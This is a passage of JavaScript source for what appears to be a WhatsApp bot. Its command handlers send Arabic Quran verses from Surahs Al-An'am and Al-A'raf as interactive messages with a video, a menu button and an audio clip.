اَوَمَنْ كَانَ مَيْتًا فَاَحْيَيْنٰهُ وَجَعَلْنَا لَهٗ نُوْرًا يَّمْشِيْ بِهٖ فِى النَّاسِ كَمَنْ مَّثَلُهٗ فِى الظُّلُمٰتِ لَيْسَ بِخَارِجٍ مِّنْهَا ۗ كَذٰلِكَ زُيِّنَ لِلْكٰفِرِيْنَ مَا كَانُوْا يَعْمَلُوْنَ
وَكَذٰلِكَ جَعَلْنَا فِيْ كُلِّ قَرْيَةٍ اَكٰبِرَ مُجْرِمِيْهَا لِيَمْكُرُوْا فِيْهَا ۗ وَمَا يَمْكُرُوْنَ اِلَّا بِاَنْفُسِهِمْ وَمَا يَشْعُرُوْنَ
وَاِذَا جَاۤءَتْهُمْ اٰيَةٌ قَالُوْا لَنْ نُّؤْمِنَ حَتّٰى نُؤْتٰى مِثْلَ مَآ اُوْتِيَ رُسُلُ اللّٰهِ ۘ اَللّٰهُ اَعْلَمُ حَيْثُ يَجْعَلُ رِسَالَتَهٗ ۗ سَيُصِيْبُ الَّذِيْنَ اَجْرَمُوْا صَغَارٌ عِنْدَ اللّٰهِ وَعَذَابٌ شَدِيْدٌۢ بِمَا كَانُوْا يَمْكُرُوْنَ
فَمَنْ يُّرِدِ اللّٰهُ اَنْ يَّهْدِيَهٗ يَشْرَحْ صَدْرَهٗ لِلْاِسْلَامِ ۚ وَمَنْ يُّرِدْ اَنْ يُّضِلَّهٗ يَجْعَلْ صَدْرَهٗ ضَيِّقًا حَرَجًا كَاَنَّمَا يَصَّعَّدُ فِى السَّمَاۤءِ ۗ كَذٰلِكَ يَجْعَلُ اللّٰهُ الرِّجْسَ عَلَى الَّذِيْنَ لَا يُؤْمِنُوْنَ
وَهٰذَا صِرَاطُ رَبِّكَ مُسْتَقِيْمًا ۗ قَدْ فَصَّلْنَا الْاٰيٰتِ لِقَوْمٍ يَّذَّكَّرُوْنَ
لَهُمْ دَارُ السَّلٰمِ عِنْدَ رَبِّهِمْ وَهُوَ وَلِيُّهُمْ بِمَا كَانُوْا يَعْمَلُوْنَ
وَيَوْمَ يَحْشُرُهُمْ جَمِيْعًا ۚ يٰمَعْشَرَ الْجِنِّ قَدِ اسْتَكْثَرْتُمْ مِّنَ الْاِنْسِ ۚ وَقَالَ اَوْلِيَاۤؤُهُمْ مِّنَ الْاِنْسِ رَبَّنَا اسْتَمْتَعَ بَعْضُنَا بِبَعْضٍ وَّبَلَغْنَآ اَجَلَنَا الَّذِيْٓ اَجَّلْتَ لَنَا ۚ قَالَ النَّارُ مَثْوٰىكُمْ خٰلِدِيْنَ فِيْهَآ اِلَّا مَا شَاۤءَ اللّٰهُ ۗ اِنَّ رَبَّكَ حَكِيْمٌ عَلِيْمٌ
وَكَذٰلِكَ نُوَلِّيْ بَعْضَ الظّٰلِمِيْنَ بَعْضًا ۢ بِمَا كَانُوْا يَكْسِبُوْنَ
يٰمَعْشَرَ الْجِنِّ وَالْاِنْسِ اَلَمْ يَأْتِكُمْ رُسُلٌ مِّنْكُمْ يَقُصُّوْنَ عَلَيْكُمْ اٰيٰتِيْ وَيُنْذِرُوْنَكُمْ لِقَاۤءَ يَوْمِكُمْ هٰذَا ۗ قَالُوْا شَهِدْنَا عَلٰٓى اَنْفُسِنَا ۖ وَغَرَّتْهُمُ الْحَيٰوةُ الدُّنْيَا وَشَهِدُوْا عَلٰٓى اَنْفُسِهِمْ اَنَّهُمْ كَانُوْا كٰفِرِيْنَ
ذٰلِكَ اَنْ لَّمْ يَكُنْ رَّبُّكَ مُهْلِكَ الْقُرٰى بِظُلْمٍ وَّاَهْلُهَا غٰفِلُوْنَ
وَلِكُلٍّ دَرَجٰتٌ مِّمَّا عَمِلُوْا ۗ وَمَا رَبُّكَ بِغَافِلٍ عَمَّا يَعْمَلُوْنَ
وَرَبُّكَ الْغَنِيُّ ذُو الرَّحْمَةِ ۗ اِنْ يَّشَأْ يُذْهِبْكُمْ وَيَسْتَخْلِفْ مِنْۢ بَعْدِكُمْ مَّا يَشَاۤءُ كَمَآ اَنْشَاَكُمْ مِّنْ ذُرِّيَّةِ قَوْمٍ اٰخَرِيْنَ
اِنَّ مَا تُوْعَدُوْنَ لَاٰتٍ ۙ وَمَآ اَنْتُمْ بِمُعْجِزِيْنَ
قُلْ يٰقَوْمِ اعْمَلُوْا عَلٰى مَكَانَتِكُمْ اِنِّيْ عَامِلٌ ۚ فَسَوْفَ تَعْلَمُوْنَ مَنْ تَكُوْنُ لَهٗ عَاقِبَةُ الدَّارِ ۗ اِنَّهٗ لَا يُفْلِحُ الظّٰلِمُوْنَ
وَجَعَلُوْا لِلّٰهِ مِمَّا ذَرَاَ مِنَ الْحَرْثِ وَالْاَنْعَامِ نَصِيْبًا فَقَالُوْا هٰذَا لِلّٰهِ بِزَعْمِهِمْ وَهٰذَا لِشُرَكَاۤىِٕنَا ۚ فَمَا كَانَ لِشُرَكَاۤىِٕهِمْ فَلَا يَصِلُ اِلَى اللّٰهِ ۚ وَمَا كَانَ لِلّٰهِ فَهُوَ يَصِلُ اِلٰى شُرَكَاۤىِٕهِمْ ۗ سَاۤءَ مَا يَحْكُمُوْنَ
وَكَذٰلِكَ زَيَّنَ لِكَثِيْرٍ مِّنَ الْمُشْرِكِيْنَ قَتْلَ اَوْلَادِهِمْ شُرَكَاۤؤُهُمْ لِيُرْدُوْهُمْ وَلِيَلْبِسُوْا عَلَيْهِمْ دِيْنَهُمْ ۗ وَلَوْ شَاۤءَ اللّٰهُ مَا فَعَلُوْهُ فَذَرْهُمْ وَمَا يَفْتَرُوْنَ
وَقَالُوْا هٰذِهٖٓ اَنْعَامٌ وَّحَرْثٌ حِجْرٌ ۖ لَّا يَطْعَمُهَآ اِلَّا مَنْ نَّشَاۤءُ بِزَعْمِهِمْ وَاَنْعَامٌ حُرِّمَتْ ظُهُوْرُهَا وَاَنْعَامٌ لَّا يَذْكُرُوْنَ اسْمَ اللّٰهِ عَلَيْهَا افْتِرَاۤءً عَلَيْهِ ۗ سَيَجْزِيْهِمْ بِمَا كَانُوْا يَفْتَرُوْنَ
وَقَالُوْا مَا فِيْ بُطُوْنِ هٰذِهِ الْاَنْعَامِ خَالِصَةٌ لِّذُكُوْرِنَا وَمُحَرَّمٌ عَلٰٓى اَزْوَاجِنَا ۚ وَاِنْ يَّكُنْ مَّيْتَةً فَهُمْ فِيْهِ شُرَكَاۤءُ ۗ سَيَجْزِيْهِمْ وَصْفَهُمْ ۗ اِنَّهٗ حَكِيْمٌ عَلِيْمٌ
قَدْ خَسِرَ الَّذِيْنَ قَتَلُوْٓا اَوْلَادَهُمْ سَفَهًا ۢ بِغَيْرِ عِلْمٍ وَّحَرَّمُوْا مَا رَزَقَهُمُ اللّٰهُ افْتِرَاۤءً عَلَى اللّٰهِ ۗ قَدْ ضَلُّوْا وَمَا كَانُوْا مُهْتَدِيْنَ
وَهُوَ الَّذِيْٓ اَنْشَاَ جَنّٰتٍ مَّعْرُوْشٰتٍ وَّغَيْرَ مَعْرُوْشٰتٍ وَّالنَّخْلَ وَالزَّرْعَ مُخْتَلِفًا اُكُلُهٗ وَالزَّيْتُوْنَ وَالرُّمَّانَ مُتَشَابِهًا وَّغَيْرَ مُتَشَابِهٍ ۗ كُلُوْا مِنْ ثَمَرِهٖٓ اِذَآ اَثْمَرَ وَاٰتُوْا حَقَّهٗ يَوْمَ حَصَادِهٖ ۖ وَلَا تُسْرِفُوْا ۗ اِنَّهٗ لَا يُحِبُّ الْمُسْرِفِيْنَ
وَمِنَ الْاَنْعَامِ حَمُوْلَةً وَّفَرْشًا ۗ كُلُوْا مِمَّا رَزَقَكُمُ اللّٰهُ وَلَا تَتَّبِعُوْا خُطُوٰتِ الشَّيْطٰنِ ۗ اِنَّهٗ لَكُمْ عَدُوٌّ مُّبِيْنٌ
ثَمٰنِيَةَ اَزْوَاجٍ ۚ مِنَ الضَّاْنِ اثْنَيْنِ وَمِنَ الْمَعْزِ اثْنَيْنِ ۗ قُلْ ءٰٓالذَّكَرَيْنِ حَرَّمَ اَمِ الْاُنْثَيَيْنِ اَمَّا اشْتَمَلَتْ عَلَيْهِ اَرْحَامُ الْاُنْثَيَيْنِ ۗ نَبِّـُٔوْنِيْ بِعِلْمٍ اِنْ كُنْتُمْ صٰدِقِيْنَ
وَمِنَ الْاِبِلِ اثْنَيْنِ وَمِنَ الْبَقَرِ اثْنَيْنِ ۗ قُلْ ءٰٓالذَّكَرَيْنِ حَرَّمَ اَمِ الْاُنْثَيَيْنِ اَمَّا اشْتَمَلَتْ عَلَيْهِ اَرْحَامُ الْاُنْثَيَيْنِ ۗ اَمْ كُنْتُمْ شُهَدَاۤءَ اِذْ وَصّٰىكُمُ اللّٰهُ بِهٰذَا ۚ فَمَنْ اَظْلَمُ مِمَّنِ افْتَرٰى عَلَى اللّٰهِ كَذِبًا لِّيُضِلَّ النَّاسَ بِغَيْرِ عِلْمٍ ۗ اِنَّ اللّٰهَ لَا يَهْدِى الْقَوْمَ الظّٰلِمِيْنَ
قُلْ لَّآ اَجِدُ فِيْ مَآ اُوْحِيَ اِلَيَّ مُحَرَّمًا عَلٰى طَاعِمٍ يَّطْعَمُهٗٓ اِلَّآ اَنْ يَّكُوْنَ مَيْتَةً اَوْ دَمًا مَّسْفُوْحًا اَوْ لَحْمَ خِنْزِيْرٍ فَاِنَّهٗ رِجْسٌ اَوْ فِسْقًا اُهِلَّ لِغَيْرِ اللّٰهِ بِهٖ ۚ فَمَنِ اضْطُرَّ غَيْرَ بَاغٍ وَّلَا عَادٍ فَاِنَّ رَبَّكَ غَفُوْرٌ رَّحِيْمٌ
وَعَلَى الَّذِيْنَ هَادُوْا حَرَّمْنَا كُلَّ ذِيْ ظُفُرٍ ۚ وَمِنَ الْبَقَرِ وَالْغَنَمِ حَرَّمْنَا عَلَيْهِمْ شُحُوْمَهُمَآ اِلَّا مَا حَمَلَتْ ظُهُوْرُهُمَآ اَوِ الْحَوَايَآ اَوْ مَا اخْتَلَطَ بِعَظْمٍ ۗ ذٰلِكَ جَزَيْنٰهُمْ بِبَغْيِهِمْ ۖ وَاِنَّا لَصٰدِقُوْنَ
فَاِنْ كَذَّبُوْكَ فَقُلْ رَّبُّكُمْ ذُوْ رَحْمَةٍ وَّاسِعَةٍ ۚ وَلَا يُرَدُّ بَأْسُهٗ عَنِ الْقَوْمِ الْمُجْرِمِيْنَ
سَيَقُوْلُ الَّذِيْنَ اَشْرَكُوْا لَوْ شَاۤءَ اللّٰهُ مَآ اَشْرَكْنَا وَلَا اٰبَاۤؤُنَا وَلَا حَرَّمْنَا مِنْ شَيْءٍ ۗ كَذٰلِكَ كَذَّبَ الَّذِيْنَ مِنْ قَبْلِهِمْ حَتّٰى ذَاقُوْا بَأْسَنَا ۗ قُلْ هَلْ عِنْدَكُمْ مِّنْ عِلْمٍ فَتُخْرِجُوْهُ لَنَا ۗ اِنْ تَتَّبِعُوْنَ اِلَّا الظَّنَّ وَاِنْ اَنْتُمْ اِلَّا تَخْرُصُوْنَ
قُلْ فَلِلّٰهِ الْحُجَّةُ الْبَالِغَةُ ۚ فَلَوْ شَاۤءَ لَهَدٰىكُمْ اَجْمَعِيْنَ
قُلْ هَلُمَّ شُهَدَاۤءَكُمُ الَّذِيْنَ يَشْهَدُوْنَ اَنَّ اللّٰهَ حَرَّمَ هٰذَا ۚ فَاِنْ شَهِدُوْا فَلَا تَشْهَدْ مَعَهُمْ ۚ وَلَا تَتَّبِعْ اَهْوَاۤءَ الَّذِيْنَ كَذَّبُوْا بِاٰيٰتِنَا وَالَّذِيْنَ لَا يُؤْمِنُوْنَ بِالْاٰخِرَةِ وَهُمْ بِرَبِّهِمْ يَعْدِلُوْنَ
قُلْ تَعَالَوْا اَتْلُ مَا حَرَّمَ رَبُّكُمْ عَلَيْكُمْ اَلَّا تُشْرِكُوْا بِهٖ شَيْـًٔا وَّبِالْوَالِدَيْنِ اِحْسَانًا ۚ وَلَا تَقْتُلُوْٓا اَوْلَادَكُمْ مِّنْ اِمْلَاقٍ ۗ نَحْنُ نَرْزُقُكُمْ وَاِيَّاهُمْ ۚ وَلَا تَقْرَبُوا الْفَوَاحِشَ مَا ظَهَرَ مِنْهَا وَمَا بَطَنَ ۚ وَلَا تَقْتُلُوا النَّفْسَ الَّتِيْ حَرَّمَ اللّٰهُ اِلَّا بِالْحَقِّ ۗ ذٰلِكُمْ وَصّٰىكُمْ بِهٖ لَعَلَّكُمْ تَعْقِلُوْنَ
وَلَا تَقْرَبُوْا مَالَ الْيَتِيْمِ اِلَّا بِالَّتِيْ هِيَ اَحْسَنُ حَتّٰى يَبْلُغَ اَشُدَّهٗ ۚ وَاَوْفُوا الْكَيْلَ وَالْمِيْزَانَ بِالْقِسْطِ ۚ لَا نُكَلِّفُ نَفْسًا اِلَّا وُسْعَهَا ۚ وَاِذَا قُلْتُمْ فَاعْدِلُوْا وَلَوْ كَانَ ذَا قُرْبٰى ۚ وَبِعَهْدِ اللّٰهِ اَوْفُوْا ۗ ذٰلِكُمْ وَصّٰىكُمْ بِهٖ لَعَلَّكُمْ تَذَكَّرُوْنَ
وَاَنَّ هٰذَا صِرَاطِيْ مُسْتَقِيْمًا فَاتَّبِعُوْهُ ۚ وَلَا تَتَّبِعُوا السُّبُلَ فَتَفَرَّقَ بِكُمْ عَنْ سَبِيْلِهٖ ۗ ذٰلِكُمْ وَصّٰىكُمْ بِهٖ لَعَلَّكُمْ تَتَّقُوْنَ
ثُمَّ اٰتَيْنَا مُوْسَى الْكِتٰبَ تَمَامًا عَلَى الَّذِيْٓ اَحْسَنَ وَتَفْصِيْلًا لِّكُلِّ شَيْءٍ وَّهُدًى وَّرَحْمَةً لَّعَلَّهُمْ بِلِقَاۤءِ رَبِّهِمْ يُؤْمِنُوْنَ
وَهٰذَا كِتٰبٌ اَنْزَلْنٰهُ مُبٰرَكٌ فَاتَّبِعُوْهُ وَاتَّقُوْا لَعَلَّكُمْ تُرْحَمُوْنَ
اَنْ تَقُوْلُوْٓا اِنَّمَآ اُنْزِلَ الْكِتٰبُ عَلٰى طَاۤىِٕفَتَيْنِ مِنْ قَبْلِنَا ۖ وَاِنْ كُنَّا عَنْ دِرَاسَتِهِمْ لَغٰفِلِيْنَ
اَوْ تَقُوْلُوْا لَوْ اَنَّآ اُنْزِلَ عَلَيْنَا الْكِتٰبُ لَكُنَّآ اَهْدٰى مِنْهُمْ ۚ فَقَدْ جَاۤءَكُمْ بَيِّنَةٌ مِّنْ رَّبِّكُمْ وَهُدًى وَّرَحْمَةٌ ۚ فَمَنْ اَظْلَمُ مِمَّنْ كَذَّبَ بِاٰيٰتِ اللّٰهِ وَصَدَفَ عَنْهَا ۗ سَنَجْزِى الَّذِيْنَ يَصْدِفُوْنَ عَنْ اٰيٰتِنَا سُوْۤءَ الْعَذَابِ بِمَا كَانُوْا يَصْدِفُوْنَ
هَلْ يَنْظُرُوْنَ اِلَّآ اَنْ تَأْتِيَهُمُ الْمَلٰۤىِٕكَةُ اَوْ يَأْتِيَ رَبُّكَ اَوْ يَأْتِيَ بَعْضُ اٰيٰتِ رَبِّكَ ۗ يَوْمَ يَأْتِيْ بَعْضُ اٰيٰتِ رَبِّكَ لَا يَنْفَعُ نَفْسًا اِيْمَانُهَا لَمْ تَكُنْ اٰمَنَتْ مِنْ قَبْلُ اَوْ كَسَبَتْ فِيْٓ اِيْمَانِهَا خَيْرًا ۗ قُلِ انْتَظِرُوْٓا اِنَّا مُنْتَظِرُوْنَ
اِنَّ الَّذِيْنَ فَرَّقُوْا دِيْنَهُمْ وَكَانُوْا شِيَعًا لَّسْتَ مِنْهُمْ فِيْ شَيْءٍ ۗ اِنَّمَآ اَمْرُهُمْ اِلَى اللّٰهِ ثُمَّ يُنَبِّئُهُمْ بِمَا كَانُوْا يَفْعَلُوْنَ
مَنْ جَاۤءَ بِالْحَسَنَةِ فَلَهٗ عَشْرُ اَمْثَالِهَا ۚ وَمَنْ جَاۤءَ بِالسَّيِّئَةِ فَلَا يُجْزٰىٓ اِلَّا مِثْلَهَا وَهُمْ لَا يُظْلَمُوْنَ
قُلْ اِنَّنِيْ هَدٰىنِيْ رَبِّيْٓ اِلٰى صِرَاطٍ مُّسْتَقِيْمٍ ۚ دِيْنًا قِيَمًا مِّلَّةَ اِبْرٰهِيْمَ حَنِيْفًا ۚ وَمَا كَانَ مِنَ الْمُشْرِكِيْنَ
قُلْ اِنَّ صَلَاتِيْ وَنُسُكِيْ وَمَحْيَايَ وَمَمَاتِيْ لِلّٰهِ رَبِّ الْعٰلَمِيْنَ
لَا شَرِيْكَ لَهٗ ۚ وَبِذٰلِكَ اُمِرْتُ وَاَنَا۠ اَوَّلُ الْمُسْلِمِيْنَ
قُلْ اَغَيْرَ اللّٰهِ اَبْغِيْ رَبًّا وَّهُوَ رَبُّ كُلِّ شَيْءٍ ۗ وَلَا تَكْسِبُ كُلُّ نَفْسٍ اِلَّا عَلَيْهَا ۚ وَلَا تَزِرُ وَازِرَةٌ وِّزْرَ اُخْرٰى ۚ ثُمَّ اِلٰى رَبِّكُمْ مَّرْجِعُكُمْ فَيُنَبِّئُكُمْ بِمَا كُنْتُمْ فِيْهِ تَخْتَلِفُوْنَ
وَهُوَ الَّذِيْ جَعَلَكُمْ خَلٰۤىِٕفَ الْاَرْضِ وَرَفَعَ بَعْضَكُمْ فَوْقَ بَعْضٍ دَرَجٰتٍ لِّيَبْلُوَكُمْ فِيْ مَآ اٰتٰىكُمْ ۗ اِنَّ رَبَّكَ سَرِيْعُ الْعِقَابِ ۖ وَاِنَّهٗ لَغَفُوْرٌ رَّحِيْمٌ

\`[📖] 𝐒𝐇𝐀𝐃𝐀𝐐𝐀𝐋𝐀𝐇𝐔𝐋 '𝐀𝐃𝐙𝐈𝐌 [📖]\`
`

 const msg = generateWAMessageFromContent(
 m.chat,
 {
 viewOnceMessage: {
 message: {
 interactiveMessage: proto.Message.InteractiveMessage.create({
 body: proto.Message.InteractiveMessage.Body.create({
 text: ""
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: teks
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 hasMediaAttachment: true,
 videoMessage: (
 await prepareWAMessageMedia(
 { video: { url: "https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1778780066699.mp4" } },
 { upload: Asepp.waUploadToServer }
 )
 ).videoMessage,
 gifPlayback: true
 }),
 contextInfo: {
 isForwarded: true,
 forwardingScore: 999,
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363418538598013@newsletter',
 newsletterName: '𝐀𝐋-𝐐𝐔𝐑𝐀𝐍',
 serverMessageId: 145
 }
 },
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 messageParamsJson: JSON.stringify({
 limited_time_offer: {
 text: "𝐀𝐋-𝐀𝐍'𝐀𝐌",
 url: `https://quran.com/6`,
 copy_code: "BISMILLAH",
 expiration_time: Date.now() * 999
 },
 bottom_sheet: {
 in_thread_buttons_limit: 1,
 divider_indices: [0],
 list_title: "CLICK",
 button_title: "© AL-AN'AM"
 }
 }),
 buttons: [
 {
 name: "single_select",
 buttonParamsJson: JSON.stringify({
 title: "© AL-AN'AM",
 sections: [{
 title: "Menu Surat",
 highlight_label: "𝐁𝐀𝐂𝐀 𝐋𝐄𝐍𝐆𝐊𝐀𝐏 🚀",
 rows: [
 { title: "𝐓𝐞𝐤𝐬 𝐀𝐫𝐚𝐛", description: "𝐀𝐲𝐚𝐭 157-165", id: `${prefix}al-anam` }
 ]
 }]
 })
 }
 ]
 })
 })
 }
 }
 },
 { quoted: m }
 )

 await Asepp.relayMessage(m.chat, msg.message, { messageId: msg.key.id })

 await Asepp.sendMessage(
 m.chat,
 {
 audio: fs.readFileSync("./image/kacaw.mp3"),
 mimetype: "audio/mp4",
 ptt: false
 },
 { quoted: m }
 )
}
break

case 'al-araf':
case 'alaraf':
case 'araf': {
 await Asepp.sendMessage(m.chat, { react: { text: "📖", key: m.key } })

 let teks = `\`𝗦𝗨𝗥𝗔𝗧 𝗔𝗟-𝗔'𝗥𝗔𝗙\`
Surat ke-7 | 206 ayat | Makkiyah | Tempat Tertinggi

⌲ \`𝐓𝐄𝐊𝐒 𝐀𝐑𝐀𝐁 𝐋𝐄𝐍𝐆𝐊𝐀𝐏\`
بِسْمِ اللّٰهِ الرَّحْمٰنِ الرَّحِيْمِ
الۤمۤصۤ
كِتٰبٌ اُنْزِلَ اِلَيْكَ فَلَا يَكُنْ فِيْ صَدْرِكَ حَرَجٌ مِّنْهُ لِتُنْذِرَ بِهٖ وَذِكْرٰى لِلْمُؤْمِنِيْنَ
اِتَّبِعُوْا مَآ اُنْزِلَ اِلَيْكُمْ مِّنْ رَّبِّكُمْ وَلَا تَتَّبِعُوْا مِنْ دُوْنِهٖٓ اَوْلِيَاۤءَ ۗ قَلِيْلًا مَّا تَذَكَّرُوْنَ
وَكَمْ مِّنْ قَرْيَةٍ اَهْلَكْنٰهَا فَجَاۤءَهَا بَأْسُنَا بَيَاتًا اَوْ هُمْ قَاۤىِٕلُوْنَ
فَمَا كَانَ دَعْوٰىهُمْ اِذْ جَاۤءَهُمْ بَأْسُنَآ اِلَّآ اَنْ قَالُوْٓا اِنَّا كُنَّا ظٰلِمِيْنَ
فَلَنَسْـَٔلَنَّ الَّذِيْنَ اُرْسِلَ اِلَيْهِمْ وَلَنَسْـَٔلَنَّ الْمُرْسَلِيْنَ
فَلَنَقُصَّنَّ عَلَيْهِمْ بِعِلْمٍ وَّمَا كُنَّا غَاۤىِٕبِيْنَ
وَالْوَزْنُ يَوْمَىِٕذِ ِۨالْحَقُّ ۚ فَمَنْ ثَقُلَتْ مَوَازِيْنُهٗ فَاُولٰۤىِٕكَ هُمُ الْمُفْلِحُوْنَ
وَمَنْ خَفَّتْ مَوَازِيْنُهٗ فَاُولٰۤىِٕكَ الَّذِيْنَ خَسِرُوْٓا اَنْفُسَهُمْ بِمَا كَانُوْا بِاٰيٰتِنَا يَظْلِمُوْنَ
وَلَقَدْ مَكَّنّٰكُمْ فِى الْاَرْضِ وَجَعَلْنَا لَكُمْ فِيْهَا مَعَايِشَ ۗ قَلِيْلًا مَّا تَشْكُرُوْنَ
وَلَقَدْ خَلَقْنٰكُمْ ثُمَّ صَوَّرْنٰكُمْ ثُمَّ قُلْنَا لِلْمَلٰۤىِٕكَةِ اسْجُدُوْا لِاٰدَمَ ۖ فَسَجَدُوْٓا اِلَّآ اِبْلِيْسَۗ لَمْ يَكُنْ مِّنَ السّٰجِدِيْنَ
قَالَ مَا مَنَعَكَ اَلَّا تَسْجُدَ اِذْ اَمَرْتُكَ ۗ قَالَ اَنَا۠ خَيْرٌ مِّنْهُ ۚ خَلَقْتَنِيْ مِنْ نَّارٍ وَّخَلَقْتَهٗ مِنْ طِيْنٍ
قَالَ فَاهْبِطْ مِنْهَا فَمَا يَكُوْنُ لَكَ اَنْ تَتَكَبَّرَ فِيْهَا فَاخْرُجْ اِنَّكَ مِنَ الصّٰغِرِيْنَ
قَالَ اَنْظِرْنِيْٓ اِلٰى يَوْمِ يُبْعَثُوْنَ
قَالَ اِنَّكَ مِنَ الْمُنْظَرِيْنَ
قَالَ فَبِمَآ اَغْوَيْتَنِيْ لَاَقْعُدَنَّ لَهُمْ صِرَاطَكَ الْمُسْتَقِيْمَ
ثُمَّ لَاٰتِيَنَّهُمْ مِّنْۢ بَيْنِ اَيْدِيْهِمْ وَمِنْ خَلْفِهِمْ وَعَنْ اَيْمَانِهِمْ وَعَنْ شَمَاۤىِٕلِهِمْ ۗ وَلَا تَجِدُ اَكْثَرَهُمْ شٰكِرِيْنَ
قَالَ اخْرُجْ مِنْهَا مَذْءُوْمًا مَّدْحُوْرًا ۗ لَمَنْ تَبِعَكَ مِنْهُمْ لَاَمْلَـَٔنَّ جَهَنَّمَ مِنْكُمْ اَجْمَعِيْنَ
وَيٰٓاٰدَمُ اسْكُنْ اَنْتَ وَزَوْجُكَ الْجَنَّةَ فَكُلَا مِنْ حَيْثُ شِئْتُمَا وَلَا تَقْرَبَا هٰذِهِ الشَّجَرَةَ فَتَكُوْنَا مِنَ الظّٰلِمِيْنَ
فَوَسْوَسَ لَهُمَا الشَّيْطٰنُ لِيُبْدِيَ لَهُمَا مَا وٗرِيَ عَنْهُمَا مِنْ سَوْاٰتِهِمَا وَقَالَ مَا نَهٰىكُمَا رَبُّكُمَا عَنْ هٰذِهِ الشَّجَرَةِ اِلَّآ اَنْ تَكُوْنَا مَلَكَيْنِ اَوْ تَكُوْنَا مِنَ الْخٰلِدِيْنَ
وَقَاسَمَهُمَآ اِنِّيْ لَكُمَا لَمِنَ النّٰصِحِيْنَ
فَدَلّٰىهُمَا بِغُرُوْرٍ ۚ فَلَمَّا ذَاقَا الشَّجَرَةَ بَدَتْ لَهُمَا سَوْاٰتُهُمَا وَطَفِقَا يَخْصِفٰنِ عَلَيْهِمَا مِنْ وَّرَقِ الْجَنَّةِ ۗ وَنَادٰىهُمَا رَبُّهُمَآ اَلَمْ اَنْهَكُمَا عَنْ تِلْكُمَا الشَّجَرَةِ وَاَقُلْ لَّكُمَآ اِنَّ الشَّيْطٰنَ لَكُمَا عَدُوٌّ مُّبِيْنٌ
قَالَا رَبَّنَا ظَلَمْنَآ اَنْفُسَنَا وَاِنْ لَّمْ تَغْفِرْ لَنَا وَتَرْحَمْنَا لَنَكُوْنَنَّ مِنَ الْخٰسِرِيْنَ
قَالَ اهْبِطُوْا بَعْضُكُمْ لِبَعْضٍ عَدُوٌّ ۚ وَلَكُمْ فِى الْاَرْضِ مُسْتَقَرٌّ وَّمَتَاعٌ اِلٰى حِيْنٍ
قَالَ فِيْهَا تَحْيَوْنَ وَفِيْهَا تَمُوْتُوْنَ وَمِنْهَا تُخْرَجُوْنَ
يٰبَنِيْٓ اٰدَمَ قَدْ اَنْزَلْنَا عَلَيْكُمْ لِبَاسًا يُّوَارِيْ سَوْاٰتِكُمْ وَرِيْشًا ۗ وَلِبَاسُ التَّقْوٰى ذٰلِكَ خَيْرٌ ۗ ذٰلِكَ مِنْ اٰيٰتِ اللّٰهِ لَعَلَّهُمْ يَذَّكَّرُوْنَ
يٰبَنِيْٓ اٰدَمَ لَا يَفْتِنَنَّكُمُ الشَّيْطٰنُ كَمَآ اَخْرَجَ اَبَوَيْكُمْ مِّنَ الْجَنَّةِ يَنْزِعُ عَنْهُمَا لِبَاسَهُمَا لِيُرِيَهُمَا سَوْاٰتِهِمَا ۗ اِنَّهٗ يَرٰىكُمْ هُوَ وَقَبِيْلُهٗ مِنْ حَيْثُ لَا تَرَوْنَهُمْ ۗ اِنَّا جَعَلْنَا الشَّيٰطِيْنَ اَوْلِيَاۤءَ لِلَّذِيْنَ لَا يُؤْمِنُوْنَ
وَاِذَا فَعَلُوْا فَاحِشَةً قَالُوْا وَجَدْنَا عَلَيْهَا اٰبَاۤءَنَا وَاللّٰهُ اَمَرَنَا بِهَا ۗ قُلْ اِنَّ اللّٰهَ لَا يَأْمُرُ بِالْفَحْشَاۤءِ ۗ اَتَقُوْلُوْنَ عَلَى اللّٰهِ مَا لَا تَعْلَمُوْنَ
قُلْ اَمَرَ رَبِّيْ بِالْقِسْطِ ۖ وَاَقِيْمُوْا وُجُوْهَكُمْ عِنْدَ كُلِّ مَسْجِدٍ وَّادْعُوْهُ مُخْلِصِيْنَ لَهُ الدِّيْنَ ۗ كَمَا بَدَاَكُمْ تَعُوْدُوْنَ
فَرِيْقًا هَدٰى وَفَرِيْقًا حَقَّ عَلَيْهِمُ الضَّلٰلَةُ ۗ اِنَّهُمُ اتَّخَذُوا الشَّيٰطِيْنَ اَوْلِيَاۤءَ مِنْ دُوْنِ اللّٰهِ وَيَحْسَبُوْنَ اَنَّهُمْ مُّهْتَدُوْنَ
يٰبَنِيْٓ اٰدَمَ خُذُوْا زِيْنَتَكُمْ عِنْدَ كُلِّ مَسْجِدٍ وَّكُلُوْا وَاشْرَبُوْا وَلَا تُسْرِفُوْا ۚ اِنَّهٗ لَا يُحِبُّ الْمُسْرِفِيْنَ
قُلْ مَنْ حَرَّمَ زِيْنَةَ اللّٰهِ الَّتِيْٓ اَخْرَجَ لِعِبَادِهٖ وَالطَّيِّبٰتِ مِنَ الرِّزْقِ ۗ قُلْ هِيَ لِلَّذِيْنَ اٰمَنُوْا فِى الْحَيٰوةِ الدُّنْيَا خَالِصَةً يَّوْمَ الْقِيٰمَةِ ۗ كَذٰلِكَ نُفَصِّلُ الْاٰيٰتِ لِقَوْمٍ يَّعْلَمُوْنَ
قُلْ اِنَّمَا حَرَّمَ رَبِّيَ الْفَوَاحِشَ مَا ظَهَرَ مِنْهَا وَمَا بَطَنَ وَالْاِثْمَ وَالْبَغْيَ بِغَيْرِ الْحَقِّ وَاَنْ تُشْرِكُوْا بِاللّٰهِ مَا لَمْ يُنَزِّلْ بِهٖ سُلْطٰنًا ۙ وَّاَنْ تَقُوْلُوْا عَلَى اللّٰهِ مَا لَا تَعْلَمُوْنَ
وَلِكُلِّ اُمَّةٍ اَجَلٌ ۚ فَاِذَا جَاۤءَ اَجَلُهُمْ لَا يَسْتَأْخِرُوْنَ سَاعَةً وَّلَا يَسْتَقْدِمُوْنَ
يٰبَنِيْٓ اٰدَمَ اِمَّا يَأْتِيَنَّكُمْ رُسُلٌ مِّنْكُمْ يَقُصُّوْنَ عَلَيْكُمْ اٰيٰتِيْ ۙ فَمَنِ اتَّقٰى وَاَصْلَحَ فَلَا خَوْفٌ عَلَيْهِمْ وَلَا هُمْ يَحْزَنُوْنَ
